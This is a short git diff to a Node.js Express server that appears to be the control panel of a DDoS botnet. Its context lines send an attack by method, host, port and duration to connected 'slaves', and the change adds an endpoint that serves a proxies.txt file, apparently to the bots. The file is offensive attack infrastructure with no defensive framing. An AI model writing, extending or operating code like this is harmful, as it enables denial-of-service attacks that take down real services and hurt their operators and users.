@@ -5,6 +5,7 @@ const Joi = require("joi")
 const chalkGradient = require("gradient-string")
 const chalkAnimation = require("chalk-animation")
 const terminalLink = require("terminal-link")
+const fs = require("fs")
 const app = express()
 
 const HTTP_PORT = 3000
@@ -57,6 +58,15 @@ app.get("/", (req, res) => {
         return res.status(404).send("method does not exist")
     sendAttack(method, host, port, time)
     return res.send(`attack sent to ${clients.length} slaves.`)
+})
+
+app.get("/proxies", (req, res) => {
+    try {
+        const data = fs.readFileSync("proxies.txt")
+        res.send(data)
+    } catch {
+        res.send("")
+    }
 })
 
 var server = net.createServer(function (socket) {
